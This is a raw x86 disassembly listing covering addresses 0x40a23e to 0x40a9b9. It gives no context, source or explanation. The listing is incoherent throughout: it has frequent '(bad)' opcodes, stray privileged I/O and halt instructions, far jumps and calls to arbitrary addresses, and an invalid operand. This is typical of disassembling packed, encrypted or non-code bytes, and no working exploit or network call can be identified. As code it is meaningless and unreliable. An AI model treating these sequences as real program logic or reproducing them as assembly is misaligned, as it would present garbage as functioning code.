  40a23e:	cmp    al,0x92
  40a240:	jae    0x40a25d
  40a242:	cmp    edx,DWORD PTR [esi-0xe12e212]
  40a248:	pop    esp
  40a249:	mov    edi,0x4d27459
  40a24e:	cmp    DWORD PTR [eax-0x3e32f9b0],0xffffff85
  40a255:	fdiv   st(6),st
  40a257:	into   
  40a258:	push   ecx
  40a259:	push   esi
  40a25a:	in     eax,dx
  40a25b:	fiadd  WORD PTR [edx+0x3b]
  40a25e:	sbb    BYTE PTR [edi],al
  40a260:	jnp    0x40a27c
  40a262:	xor    ah,ah
  40a264:	shl    BYTE PTR [eax+esi*1+0x32],0xb6
  40a269:	jge    0x40a216
  40a26b:	mov    ch,0x27
  40a26d:	pop    eax
  40a26e:	(bad)  
  40a26f:	adc    edx,DWORD PTR [ecx+0x0]
  40a272:	and    al,0x2
  40a274:	and    ch,BYTE PTR [edi+0x14]
  40a277:	stos   DWORD PTR es:[edi],eax
  40a278:	push   eax
  40a279:	pop    es
  40a27a:	cmp    al,0x4d
  40a27c:	aad    0xef
  40a27e:	std    
  40a27f:	aam    0xe3
  40a281:	pop    esp
  40a282:	sbb    edi,DWORD PTR [esp+ecx*1+0x41]
  40a286:	mov    eax,ds:0x61569ad
  40a28b:	inc    ebx
  40a28c:	in     al,0xe3
  40a28e:	or     edi,edx
  40a290:	pmulhuw mm6,mm4
  40a293:	xchg   edi,eax
  40a294:	out    0x5e,al
  40a296:	sbb    ebx,DWORD PTR [ebx+0x6a]
  40a299:	jne    0x40a2db
  40a29b:	retf   0x2228
  40a29e:	(bad)  
  40a29f:	hlt    
  40a2a0:	retf   0xc3b
  40a2a3:	mov    al,0x7a
  40a2a5:	jo     0x40a303
  40a2a7:	(bad)  
  40a2a8:	and    eax,0x5bfec0af
  40a2ad:	ins    DWORD PTR es:[edi],dx
  40a2ae:	pop    ds
  40a2af:	imul   esi,DWORD PTR [edx+ebx*4+0x26],0xdb60bfc3
  40a2b7:	rol    esp,cl
  40a2b9:	sbb    ecx,DWORD PTR [esi]
  40a2bb:	dec    DWORD PTR [eax-0x74]
  40a2be:	sub    al,dh
  40a2c0:	push   0x55ace3e8
  40a2c5:	lea    edx,[esi-0x7b17c2d2]
  40a2cb:	data16 jnp 0x40a2d1
  40a2ce:	jnp    0x40a310
  40a2d0:	sub    DWORD PTR [eax-0x44173cab],esp
  40a2d6:	xchg   esp,eax
  40a2d7:	sar    BYTE PTR [ebp-0x44],1
  40a2da:	mov    BYTE PTR [eax+0x10],ah
  40a2dd:	dec    eax
  40a2de:	loopne 0x40a2ae
  40a2e0:	cwde   
  40a2e1:	imul   esi,DWORD PTR [edi-0x7f36cb1d],0x9061be5f
  40a2eb:	or     ch,cl
  40a2ed:	imul   ebp,DWORD PTR [ebp-0x549df127],0x1365b906
  40a2f7:	rcr    BYTE PTR [esp+ecx*8-0x4668c06e],1
  40a2fe:	smsw   WORD PTR [ebx+0x10]
  40a302:	aam    0x24
  40a304:	cli    
  40a305:	lods   al,BYTE PTR ds:[esi]
  40a306:	test   DWORD PTR [eax-0x1928088c],ebx
  40a30c:	test   eax,0x21b2400c
  40a311:	jns    0x40a29c
  40a313:	pop    edx
  40a314:	inc    esp
  40a315:	pop    ebx
  40a316:	shr    DWORD PTR [eax-0x79],1
  40a319:	loope  0x40a379
  40a31b:	loop   0x40a380
  40a31d:	mov    edi,0x49ee49a8
  40a322:	mov    ebp,0xad72a937
  40a327:	shr    BYTE PTR [ecx+0x5293c570],1
  40a32d:	std    
  40a32e:	enter  0xb4fa,0xa6
  40a332:	fcom   st(5)
  40a334:	daa    
  40a335:	xchg   ebp,eax
  40a336:	inc    ecx
  40a337:	mov    dl,0x64
  40a339:	jb     0x40a350
  40a33b:	and    edi,DWORD PTR [ebx+0x59]
  40a33e:	dec    edx
  40a33f:	jecxz  0x40a37a
  40a341:	les    edx,FWORD PTR [edi-0x16c67739]
  40a347:	jns    0x40a396
  40a349:	or     dh,BYTE PTR gs:[esi+ebx*2+0x28e2747a]
  40a351:	sub    esi,edi
  40a353:	xor    DWORD PTR [esi],0x67
  40a356:	add    al,0x32
  40a358:	xchg   edi,eax
  40a359:	xor    esi,ebp
  40a35b:	test   BYTE PTR [eax+0x29],cl
  40a35e:	and    cl,BYTE PTR [ebx-0x75c3b6a3]
  40a364:	retf   
  40a365:	cli    
  40a366:	repz mov edi,0xc0f752f8
  40a36c:	dec    esi
  40a36d:	outs   dx,BYTE PTR ds:[esi]
  40a36e:	dec    ebp
  40a36f:	pop    eax
  40a370:	pop    ebx
  40a371:	pmulhuw mm7,QWORD PTR [esi]
  40a374:	jmp    FWORD PTR [esi+0x4e]
  40a377:	mov    cl,0x9b
  40a379:	mov    bh,0x6b
  40a37b:	sub    edi,DWORD PTR [edi]
  40a37d:	outs   dx,BYTE PTR ds:[esi]
  40a37e:	xchg   ecx,eax
  40a37f:	push   edx
  40a380:	sub    BYTE PTR [edi],dh
  40a382:	dec    ecx
  40a383:	je     0x40a312
  40a385:	push   cs
  40a386:	in     al,dx
  40a387:	jmp    0x850fca05
  40a38c:	jle    0x40a318
  40a38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a38f:	shl    DWORD PTR [esi-0x1b],cl
  40a392:	test   esp,edi
  40a394:	jns    0x40a387
  40a396:	jp     0x40a33e
  40a398:	dec    ebx
  40a399:	div    BYTE PTR [edi]
  40a39b:	jecxz  0x40a406
  40a39d:	ficomp WORD PTR [edx+0x67]
  40a3a0:	or     DWORD PTR [ebx+ecx*2-0x4c],edx
  40a3a4:	lahf   
  40a3a5:	repnz adc al,0xd2
  40a3a8:	dec    ebx
  40a3a9:	test   al,0x9b
  40a3ab:	jp     0x40a3cf
  40a3ad:	enter  0xb855,0xdd
  40a3b1:	dec    esp
  40a3b2:	sbb    DWORD PTR [ecx+esi*4],esi
  40a3b5:	and    DWORD PTR [ecx-0x10c24b09],ebp
  40a3bb:	test   al,0x5a
  40a3bd:	mov    esp,0x1ff82788
  40a3c2:	xor    edx,DWORD PTR [eax]
  40a3c4:	mov    fs,eax
  40a3c6:	lock cli 
  40a3c8:	mov    al,0x19
  40a3ca:	dec    ecx
  40a3cb:	inc    edi
  40a3cc:	push   esp
  40a3cd:	(bad)  
  40a3ce:	in     al,dx
  40a3cf:	dec    esp
  40a3d0:	sbb    BYTE PTR ds:0xa39b85e0,bh
  40a3d6:	xchg   esi,eax
  40a3d7:	rcl    DWORD PTR [ebx+0x3c],0x2a
  40a3db:	jle    0x40a3c7
  40a3dd:	mov    esp,0x39e6532d
  40a3e2:	les    ebx,FWORD PTR [ecx+0x6a]
  40a3e5:	out    dx,eax
  40a3e6:	pop    ebx
  40a3e7:	sbb    eax,0x58f0997d
  40a3ec:	out    0x6d,al
  40a3ee:	or     DWORD PTR [edx+0xe],eax
  40a3f1:	pop    esp
  40a3f2:	cmp    DWORD PTR [eax+0x40],ecx
  40a3f5:	dec    ebp
  40a3f6:	std    
  40a3f7:	mov    dl,0xe0
  40a3f9:	push   esp
  40a3fa:	jne    0x40a385
  40a3fc:	inc    ebx
  40a3fd:	retf   
  40a3fe:	push   cs
  40a3ff:	pop    esp
  40a400:	(bad)  
  40a401:	fsubp  st(4),st
  40a403:	add    DWORD PTR [edx],0xffffff87
  40a406:	(bad)  
  40a407:	dec    esp
  40a408:	add    edx,DWORD PTR [ebx+edi*8-0xeb61013]
  40a40f:	sbb    edx,DWORD PTR [ebx+ebx*8+0x1ee6d240]
  40a416:	mov    ds:0xd715b2a1,al
  40a41b:	out    0xaa,al
  40a41d:	int3   
  40a41e:	hlt    
  40a41f:	cmp    dh,ah
  40a421:	hlt    
  40a422:	sub    WORD PTR [ebx-0x33e519be],si
  40a429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a42a:	ins    BYTE PTR es:[edi],dx
  40a42b:	jb     0x40a41c
  40a42d:	or     BYTE PTR [ebp+0x6],ah
  40a430:	sbb    ch,al
  40a432:	pusha  
  40a433:	jmp    FWORD PTR [ebx]
  40a435:	jge    0x40a4b3
  40a437:	mul    BYTE PTR [ebp+0x2f9bbe79]
  40a43d:	std    
  40a43e:	pop    DWORD PTR [ebx-0x5a9eb3fe]
  40a444:	test   eax,0x69ae0827
  40a449:	jo     0x40a44e
  40a44b:	les    edi,FWORD PTR [ebp-0x15df3d7b]
  40a451:	xor    BYTE PTR [edi],ch
  40a453:	push   edi
  40a454:	sub    ah,ch
  40a456:	jmp    0x2d727efa
  40a45b:	in     al,dx
  40a45c:	(bad)  
  40a45d:	and    cl,ch
  40a45f:	add    DWORD PTR [edx],0x13
  40a462:	lahf   
  40a463:	jp     0x40a425
  40a465:	jp     0x40a4ba
  40a467:	rol    DWORD PTR [esi],0x9e
  40a46a:	xor    DWORD PTR [ebp+0x4c1ad04a],ebx
  40a470:	in     al,0xa9
  40a472:	jo     0x40a3f4
  40a474:	jp     0x40a457
  40a476:	jmp    0x4a77:0x14a4d1c1
  40a47d:	in     al,0xbe
  40a47f:	ja     0x40a4cc
  40a481:	(bad)
  40a484:	jecxz  0x40a488
  40a486:	mov    DWORD PTR [edi],esi
  40a488:	sbb    ecx,DWORD PTR fs:[edx+edx*8-0x22942e20]
  40a490:	push   0x19fd3a57
  40a495:	xchg   esi,eax
  40a496:	shl    dh,0x9d
  40a499:	dec    edx
  40a49a:	(bad)  
  40a49b:	sbb    al,0xfd
  40a49d:	pop    cx
  40a49f:	cmp    BYTE PTR [ebx-0x7a33c522],0x27
  40a4a6:	jo     0x40a4df
  40a4a8:	pop    edx
  40a4a9:	rol    BYTE PTR [edi-0x72],cl
  40a4ac:	or     esp,eax
  40a4ae:	out    dx,al
  40a4af:	clc    
  40a4b0:	addr16 xchg ecx,eax
  40a4b2:	push   edx
  40a4b3:	mov    eax,cs
  40a4b5:	jnp    0x40a4e4
  40a4b7:	mov    esp,0x8363b7d2
  40a4bc:	sub    al,0xa6
  40a4be:	pop    ds
  40a4bf:	shl    ah,cl
  40a4c1:	mov    ecx,0x931e41cf
  40a4c6:	adc    ebp,eax
  40a4c8:	sub    DWORD PTR [ebp-0x66],0x7a6b3cb3
  40a4cf:	dec    esi
  40a4d0:	xchg   ebx,eax
  40a4d1:	or     esp,ebp
  40a4d3:	add    ebp,DWORD PTR [esi]
  40a4d5:	push   edi
  40a4d6:	mov    dh,0x21
  40a4d8:	ins    BYTE PTR es:[edi],dx
  40a4d9:	jae    0x40a509
  40a4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4dc:	dec    ebx
  40a4dd:	ret    0xe3c7
  40a4e0:	in     al,dx
  40a4e1:	push   es
  40a4e2:	inc    esp
  40a4e3:	(bad)  
  40a4e5:	(bad)  
  40a4e7:	inc    ecx
  40a4e8:	add    BYTE PTR [eax-0x69b7f2fc],bh
  40a4ee:	into   
  40a4ef:	sbb    DWORD PTR [eax+0x59],esp
  40a4f2:	ror    BYTE PTR [edi],0xca
  40a4f5:	and    al,0x3a
  40a4f7:	inc    edi
  40a4f8:	loop   0x40a550
  40a4fa:	sti    
  40a4fb:	cmp    al,BYTE PTR [edi+esi*1]
  40a4fe:	call   0xd936:0x9632b2e9
  40a505:	popf   
  40a506:	arpl   WORD PTR ds:0xe4091422,si
  40a50c:	ja     0x40a4da
  40a50e:	push   esp
  40a50f:	ss aad 0x19
  40a512:	sar    dl,0xd1
  40a515:	xchg   esi,eax
  40a516:	xchg   ebp,eax
  40a517:	pop    ss
  40a518:	push   0x7f
  40a51a:	mov    eax,0x3577bf8e
  40a51f:	add    cl,BYTE PTR [ecx-0xb]
  40a522:	mov    al,ds:0xd7fc0116
  40a527:	add    al,0xe1
  40a529:	mov    ah,0x7d
  40a52b:	loop   0x40a572
  40a52d:	xchg   BYTE PTR [eax],ah
  40a52f:	or     eax,0xcbcbd509
  40a534:	imul   ecx,ebp,0xea206653
  40a53a:	inc    ebx
  40a53b:	sub    BYTE PTR [edx+0x2bddc02c],ah
  40a541:	outs   dx,BYTE PTR ds:[esi]
  40a542:	clc    
  40a543:	pushf  
  40a544:	mov    WORD PTR [eax],es
  40a546:	in     al,dx
  40a547:	pop    edi
  40a548:	mov    al,ds:0xe678aada
  40a54d:	shl    DWORD PTR [edi-0x1e826909],1
  40a553:	mov    ecx,ebp
  40a555:	js     0x40a4d8
  40a557:	xor    ch,BYTE PTR [ecx]
  40a559:	add    al,0x52
  40a55b:	jmp    0x430c1956
  40a560:	sbb    eax,0x7ef449fe
  40a565:	xor    eax,0x5c832b2f
  40a56a:	repnz dec edx
  40a56c:	mov    edi,0x911bf39d
  40a571:	fimul  WORD PTR [edx+ebx*4+0x1050a283]
  40a578:	pop    eax
  40a579:	sbb    DWORD PTR [edi],esi
  40a57b:	push   ss
  40a57c:	or     BYTE PTR [esi-0x511c70d0],ch
  40a582:	jg     0x40a574
  40a584:	rcr    BYTE PTR [si+0x5d],cl
  40a588:	sti    
  40a589:	repnz cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  40a58c:	adc    BYTE PTR [edx-0x163b2e84],0x93
  40a593:	lods   al,BYTE PTR ds:[esi]
  40a594:	xor    ebp,eax
  40a596:	fsubr  QWORD PTR [ebp+0x12b791c9]
  40a59c:	cmp    ebp,edi
  40a59e:	xchg   ecx,eax
  40a59f:	idiv   BYTE PTR [eax+0x2e]
  40a5a2:	call   0xb35435fd
  40a5a7:	mov    al,0x18
  40a5a9:	xchg   esp,eax
  40a5aa:	out    0x97,eax
  40a5ac:	cmp    eax,0x4fe95b5e
  40a5b1:	les    eax,FWORD PTR [ecx-0x2b]
  40a5b4:	sub    BYTE PTR [ebp+0x14],0xc3
  40a5b8:	and    dl,BYTE PTR [ecx]
  40a5ba:	sub    al,0xcd
  40a5bc:	out    0x6,al
  40a5be:	xchg   ebx,eax
  40a5bf:	je     0x40a5ac
  40a5c1:	adc    al,0x5e
  40a5c3:	cmp    BYTE PTR [edx],dh
  40a5c5:	adc    al,0xf0
  40a5c7:	out    0x1c,eax
  40a5c9:	into   
  40a5ca:	ret    0x86cb
  40a5cd:	mov    al,0x8c
  40a5cf:	sbb    eax,DWORD PTR [edi-0x5379f46f]
  40a5d5:	mov    ?,WORD PTR [eax-0xac32ce1]
  40a5db:	jb     0x40a622
  40a5dd:	sub    eax,0xb20d8769
  40a5e2:	lods   eax,DWORD PTR ds:[esi]
  40a5e3:	mov    DWORD PTR [ebx],eax
  40a5e5:	dec    eax
  40a5e6:	mov    ah,0xa2
  40a5e8:	fucomip st,st(6)
  40a5ea:	sub    edx,ebx
  40a5ec:	daa    
  40a5ed:	outs   dx,DWORD PTR ds:[esi]
  40a5ee:	ss je  0x40a635
  40a5f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5f2:	loopne 0x40a5b2
  40a5f4:	and    ah,BYTE PTR [ecx+0x3e1e4a42]
  40a5fa:	or     edx,edi
  40a5fc:	imul   ebp,DWORD PTR [eax],0x58
  40a5ff:	je     0x40a668
  40a601:	popa   
  40a602:	sub    ah,BYTE PTR [edx+ebp*1]
  40a605:	les    esp,FWORD PTR [edi-0x78d242b]
  40a60b:	adc    eax,0x3aabf2ef
  40a610:	ja     0x40a60e
  40a612:	cmp    ebp,DWORD PTR [esi-0x647d7e5d]
  40a618:	jbe    0x40a5b4
  40a61a:	xchg   ebx,eax
  40a61b:	xchg   edi,eax
  40a61c:	add    eax,0x76c48ef3
  40a621:	ins    DWORD PTR es:[edi],dx
  40a622:	nop
  40a623:	aam    0x80
  40a625:	shl    esp,1
  40a627:	fld    TBYTE PTR [ecx]
  40a629:	push   esi
  40a62a:	popa   
  40a62b:	cli    
  40a62c:	mov    ebx,0x10bd359f
  40a631:	popa   
  40a632:	sar    BYTE PTR [esi-0x65],1
  40a635:	lea    eax,[eax-0x2388e1c1]
  40a63b:	in     al,dx
  40a63c:	fisttp QWORD PTR cs:0x63b71aaa
  40a643:	cmc    
  40a644:	jmp    0x40a618
  40a646:	xchg   ebx,eax
  40a647:	aaa    
  40a648:	scas   eax,DWORD PTR es:[edi]
  40a649:	call   0x2288e231
  40a64e:	addr16 test al,0x4a
  40a651:	inc    ebp
  40a652:	add    al,0xea
  40a654:	iret   
  40a655:	loope  0x40a6af
  40a657:	ret    0xdd36
  40a65a:	xor    DWORD PTR [edi+0xac41038],ecx
  40a660:	lahf   
  40a661:	pop    ebx
  40a662:	pop    edx
  40a663:	loope  0x40a6de
  40a665:	mov    DWORD PTR [ecx-0x71],0xbbb5bdd9
  40a66c:	jo     0x40a5ee
  40a66e:	(bad)  
  40a670:	stos   BYTE PTR es:[edi],al
  40a671:	retf   0xbb1c
  40a674:	mov    esp,0x104bd525
  40a679:	mov    edx,0x6e6265e3
  40a67e:	jb     0x40a6d3
  40a680:	mov    esp,esp
  40a682:	mov    ds:0xfe8fd9be,eax
  40a687:	mov    cl,0xdf
  40a689:	lds    eax,FWORD PTR [edx-0x1a]
  40a68c:	sub    al,0x78
  40a68e:	adc    DWORD PTR [bx+si-0x4601],eax
  40a693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a694:	ss call 0x19c5124f
  40a69a:	mov    dh,0x80
  40a69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a69d:	add    DWORD PTR [edx],esp
  40a69f:	mov    ebx,0x7cd3814d
  40a6a4:	rol    DWORD PTR [edx-0x72],0x30
  40a6a8:	cwde   
  40a6a9:	ss pop es
  40a6ab:	call   0xbcad:0x2168e00c
  40a6b2:	add    eax,0xeb54ef4d
  40a6b7:	push   ebx
  40a6b8:	shl    BYTE PTR [ebp+0x46],1
  40a6bb:	(bad)  
  40a6bc:	imul   ebp,DWORD PTR [ebp-0x70],0x2aff3424
  40a6c3:	lods   eax,DWORD PTR ds:[esi]
  40a6c4:	retf   0xdaf2
  40a6c7:	das    
  40a6c8:	mov    DWORD PTR [ebx+0x7e],esi
  40a6cb:	ret    0xfcf0
  40a6ce:	rol    al,cl
  40a6d0:	xchg   esi,eax
  40a6d1:	mov    ah,0xd8
  40a6d3:	push   edi
  40a6d4:	aas    
  40a6d5:	xchg   esp,eax
  40a6d6:	mov    ds:0x3221df75,al
  40a6db:	sub    al,0x23
  40a6dd:	aas    
  40a6de:	jl     0x40a6ad
  40a6e0:	mov    eax,DWORD PTR [eax+eiz*8+0x582a452d]
  40a6e7:	xor    BYTE PTR [ebx],bh
  40a6e9:	cmp    eax,0x2ef3ac81
  40a6ee:	push   cs
  40a6ef:	mov    edi,0x5bfcfec5
  40a6f4:	and    al,BYTE PTR [ebx-0x4d]
  40a6f7:	ins    DWORD PTR es:[edi],dx
  40a6f8:	mov    ah,0x30
  40a6fa:	jl     0x40a6ab
  40a6fc:	mov    ch,BYTE PTR [esi-0x56]
  40a6ff:	pop    ebx
  40a700:	lods   al,BYTE PTR ds:[esi]
  40a701:	inc    edx
  40a702:	or     al,0x8
  40a704:	add    dh,BYTE PTR [edi]
  40a706:	shr    BYTE PTR [ecx-0x2d],0x9c
  40a70a:	into   
  40a70b:	sub    eax,0x96b37443
  40a710:	xor    BYTE PTR [ecx],ah
  40a712:	push   eax
  40a713:	dec    ebx
  40a714:	int3   
  40a715:	leave  
  40a716:	mov    esi,0xa17b1c0c
  40a71b:	daa    
  40a71c:	adc    al,0x4
  40a71e:	jno    0x40a6c3
  40a720:	imul   DWORD PTR [esi+esi*2+0x34]
  40a724:	inc    esp
  40a725:	push   ebx
  40a726:	icebp  
  40a727:	inc    ecx
  40a728:	pop    edx
  40a729:	xchg   ebp,eax
  40a72a:	scas   eax,DWORD PTR es:[edi]
  40a72b:	int3   
  40a72c:	sub    DWORD PTR [ecx+0x43],ecx
  40a72f:	xchg   BYTE PTR [esp+ecx*4+0x2d],bl
  40a733:	and    BYTE PTR [esi-0x45a73a01],ah
  40a739:	aam    0xf4
  40a73b:	pop    ds
  40a73c:	fwait
  40a73d:	push   ecx
  40a73e:	test   al,0x3d
  40a740:	sub    al,0x77
  40a742:	mov    cs,edi
  40a744:	mov    edi,0xd72d9d1
  40a749:	lock fwait
  40a74b:	call   0x189811f8
  40a750:	(bad)  
  40a751:	dec    edi
  40a752:	inc    esi
  40a753:	gs add ch,dh
  40a756:	adc    BYTE PTR [ecx+0xd],bl
  40a759:	xchg   esp,eax
  40a75a:	mov    eax,ebp
  40a75c:	mov    esp,edi
  40a75e:	and    BYTE PTR [esi+0x5d71640a],ah
  40a764:	adc    DWORD PTR [esi-0x6bb39541],esi
  40a76a:	shr    BYTE PTR [ebx+0x4a17ea10],0x60
  40a771:	das    
  40a772:	push   es
  40a773:	pop    ss
  40a774:	cmc    
  40a775:	leave  
  40a776:	ror    DWORD PTR ds:0xa745a3d8,1
  40a77c:	and    ebp,DWORD PTR [ebx+0x14]
  40a77f:	out    0x9b,al
  40a781:	cli    
  40a782:	mov    BYTE PTR [ebp-0x249630cb],al
  40a788:	mov    ebp,0xadccc196
  40a78d:	aad    0xb2
  40a78f:	mov    ds:0x6e5b612,al
  40a794:	nop
  40a795:	pop    ebp
  40a796:	inc    edi
  40a797:	fcomp  DWORD PTR [edx+0x35]
  40a79a:	not    DWORD PTR [ecx+0x28]
  40a79d:	dec    edi
  40a79e:	dec    esp
  40a79f:	adc    al,0xa5
  40a7a1:	fs sbb al,0xb
  40a7a4:	sub    eax,0x424d175b
  40a7a9:	js     0x40a78b
  40a7ab:	fidiv  DWORD PTR [edx-0x16]
  40a7ae:	and    al,0x1
  40a7b0:	jle    0x40a7a5
  40a7b2:	loopne 0x40a745
  40a7b4:	jne    0x40a7cd
  40a7b6:	jmp    0x45704f67
  40a7bb:	in     al,0xf2
  40a7bd:	cld    
  40a7be:	lods   eax,DWORD PTR ds:[esi]
  40a7bf:	mov    dl,0x3b
  40a7c1:	sbb    ah,BYTE PTR [ebx]
  40a7c3:	retf   0xd8cd
  40a7c6:	and    BYTE PTR [ecx+0x1b],al
  40a7c9:	sub    DWORD PTR [ebp+0xe75c5ef],esi
  40a7cf:	push   es
  40a7d0:	loop   0x40a7e8
  40a7d2:	retf   
  40a7d3:	jno    0x40a7f8
  40a7d5:	nop
  40a7d6:	mov    edx,0x71342802
  40a7db:	jmp    0xae4976fc
  40a7e0:	(bad)  [esi]
  40a7e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7e3:	fld    TBYTE PTR [ecx-0x3e]
  40a7e6:	mov    ds:0xde838981,eax
  40a7eb:	xchg   esi,eax
  40a7ec:	pop    esi
  40a7ed:	push   cs
  40a7ee:	inc    esi
  40a7ef:	xchg   ebx,eax
  40a7f0:	iret   
  40a7f1:	add    al,0xd7
  40a7f3:	and    eax,0xda7cb650
  40a7f8:	out    0x93,eax
  40a7fa:	push   ss
  40a7fb:	in     eax,0x1
  40a7fd:	imul   edx,DWORD PTR [ebx],0xc053f5c6
  40a803:	pop    esi
  40a804:	and    esp,DWORD PTR [eax+0x32]
  40a807:	and    eax,0xf32a841b
  40a80c:	jne    0x40a80a
  40a80e:	mov    ch,0x84
  40a810:	and    BYTE PTR [ebp+ecx*4-0x3bc214ef],0x2a
  40a818:	jle    0x40a7d1
  40a81a:	cwde   
  40a81b:	ss jecxz 0x40a7b0
  40a81e:	in     eax,0xec
  40a820:	sub    dh,al
  40a822:	aas    
  40a823:	mov    cl,0x70
  40a825:	mov    ds:0x7bec209b,al
  40a82a:	adc    eax,0x6b9277f
  40a82f:	stc    
  40a830:	call   0xd70e:0x6ddd46f
  40a837:	jnp    0x40a869
  40a839:	loope  0x40a84f
  40a83b:	stos   DWORD PTR es:[edi],eax
  40a83c:	pop    ss
  40a83d:	mov    eax,gs:0x1b152e4a
  40a843:	inc    esp
  40a844:	inc    esp
  40a845:	fadd   QWORD PTR [edx+0x64]
  40a848:	push   0xffffffe4
  40a84a:	lock ins DWORD PTR es:[edi],dx
  40a84c:	retf   
  40a84d:	ins    DWORD PTR es:[edi],dx
  40a84e:	cld    
  40a84f:	push   0x3d49d1e1
  40a854:	fsub   QWORD PTR [eax+0x2f]
  40a857:	dec    esi
  40a858:	pop    ds
  40a859:	pop    eax
  40a85a:	pop    es
  40a85b:	je     0x40a850
  40a85d:	es ins BYTE PTR es:[edi],dx
  40a85f:	rol    DWORD PTR [esi-0x47c144be],1
  40a865:	(bad)  [esp+edi*2]
  40a868:	xor    al,0x92
  40a86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86b:	mov    dh,0xf9
  40a86d:	lods   al,BYTE PTR ds:[esi]
  40a86e:	outs   dx,DWORD PTR ds:[esi]
  40a86f:	repnz mov ebx,0xa63e640f
  40a875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a876:	(bad)  
  40a877:	pop    edx
  40a878:	nop
  40a879:	out    0xbe,eax
  40a87b:	and    DWORD PTR [esi+eiz*1+0x62],eax
  40a87f:	fidiv  DWORD PTR [eax]
  40a881:	shr    DWORD PTR [eax+0x2f],0x3a
  40a885:	mov    dl,0xd9
  40a887:	iret   
  40a888:	call   0xf89ce879
  40a88d:	lods   eax,DWORD PTR ds:[esi]
  40a88e:	pop    ecx
  40a88f:	sub    eax,0x10cba99e
  40a894:	xor    esi,DWORD PTR [edi+ebp*1]
  40a897:	iret   
  40a898:	xor    al,0x96
  40a89a:	neg    esi
  40a89c:	inc    esp
  40a89d:	sbb    dh,ah
  40a89f:	add    esi,edx
  40a8a1:	adc    al,0x2f
  40a8a3:	lahf   
  40a8a4:	mov    ah,0x39
  40a8a6:	call   0xde33:0x636c713a
  40a8ad:	sbb    eax,0x9cb2cea5
  40a8b2:	push   ds
  40a8b3:	jmp    0x40a8cb
  40a8b5:	int3   
  40a8b6:	in     eax,dx
  40a8b7:	ficom  WORD PTR [esp+ebx*1-0x64]
  40a8bb:	(bad)  
  40a8bc:	imul   esi,DWORD PTR [ecx+0x697d3057],0x3
  40a8c3:	stos   DWORD PTR es:[edi],eax
  40a8c4:	jo     0x40a8aa
  40a8c6:	mov    ss,esi
  40a8c8:	retf   
  40a8c9:	sbb    al,0x18
  40a8cb:	in     eax,dx
  40a8cc:	or     DWORD PTR [ecx-0x4e],eax
  40a8cf:	int3   
  40a8d0:	push   edi
  40a8d1:	inc    ebx
  40a8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8d3:	call   FWORD PTR [edi+edi*1-0x3e]
  40a8d7:	aas    
  40a8d8:	aad    0x1c
  40a8da:	enter  0x1c32,0x44
  40a8de:	xchg   BYTE PTR [esi-0x399bbca7],al
  40a8e4:	jge    0x40a88d
  40a8e6:	mov    ecx,0x65970a5d
  40a8eb:	test   BYTE PTR [ecx+0x65cddedc],cl
  40a8f1:	push   ds
  40a8f2:	lock scas al,BYTE PTR es:[edi]
  40a8f4:	inc    eax
  40a8f5:	sub    al,0xcb
  40a8f7:	in     al,dx
  40a8f8:	pop    edx
  40a8f9:	lahf   
  40a8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8fb:	push   0x23a79ba0
  40a900:	jmp    0x40a8ef
  40a902:	sbb    eax,0xb1b97a2c
  40a907:	xor    cl,BYTE PTR [esp+eax*4]
  40a90a:	dec    ecx
  40a90b:	fcmovbe st,st(2)
  40a90d:	mov    al,ds:0xa2a4d5c0
  40a912:	dec    esi
  40a913:	shr    DWORD PTR [esi-0x4c],cl
  40a916:	adc    eax,0xf5cba466
  40a91b:	cmp    DWORD PTR [esi+0x17e9d466],esp
  40a921:	in     al,dx
  40a922:	ret    0xea13
  40a925:	cmp    al,BYTE PTR ds:[ebp-0x32]
  40a929:	std    
  40a92a:	loopne 0x40a901
  40a92c:	(bad)  
  40a92d:	jmp    0x40a970
  40a92f:	(bad)
  40a933:	pop    edx
  40a934:	inc    edi
  40a935:	sbb    eax,esi
  40a937:	mov    esp,0x238ba580
  40a93c:	pop    ds
  40a93d:	inc    edx
  40a93e:	push   0x7a
  40a940:	pop    edx
  40a941:	(bad)  
  40a942:	icebp  
  40a943:	ror    BYTE PTR [edi-0x6057c4b5],cl
  40a949:	leave  
  40a94a:	scas   eax,DWORD PTR es:[edi]
  40a94b:	xor    DWORD PTR [edx+0x656fb9f9],0xffffff87
  40a952:	imul   eax,esp,0x99a3d33b
  40a958:	ins    DWORD PTR es:[edi],dx
  40a959:	add    dl,bh
  40a95b:	mul    BYTE PTR [edx+0x1]
  40a95e:	into   
  40a95f:	xor    bh,BYTE PTR [ebp-0x50]
  40a962:	call   0xc6c3:0xd4387655
  40a969:	inc    ecx
  40a96a:	and    DWORD PTR [ebp+0xd],ebx
  40a96d:	jae    0x40a930
  40a96f:	fmul   QWORD PTR [ebx-0x2edc7ac1]
  40a975:	int3   
  40a976:	sub    ebp,DWORD PTR [esp+eax*2-0x21]
  40a97a:	out    0x2a,al
  40a97c:	test   DWORD PTR [esi-0x2c],ecx
  40a97f:	aam    0x62
  40a981:	or     edi,DWORD PTR [edi+eiz*4+0x71687912]
  40a988:	mov    ebx,0x3ce060ab
  40a98d:	cdq    
  40a98e:	sbb    BYTE PTR [edx-0x1],cl
  40a991:	inc    BYTE PTR [edx-0x12e12810]
  40a997:	stc    
  40a998:	jg     0x40aa04
  40a99a:	lahf   
  40a99b:	push   eax
  40a99c:	jae    0x40a96f
  40a99e:	fist   DWORD PTR [ebp-0x1211de56]
  40a9a4:	sub    ecx,DWORD PTR [ebx+0x7448af9f]
  40a9aa:	inc    edx
  40a9ab:	xchg   ebp,eax
  40a9ac:	mov    al,ds:0x5f6c8123
  40a9b1:	scas   eax,DWORD PTR es:[edi]
  40a9b2:	sahf   
  40a9b3:	std    
  40a9b4:	lods   al,BYTE PTR ds:[esi]
  40a9b5:	add    BYTE PTR [ecx-0x5e],0x38
  40a9b9:	xor    BYTE PTR [edx+0x2101fc94],0xc2
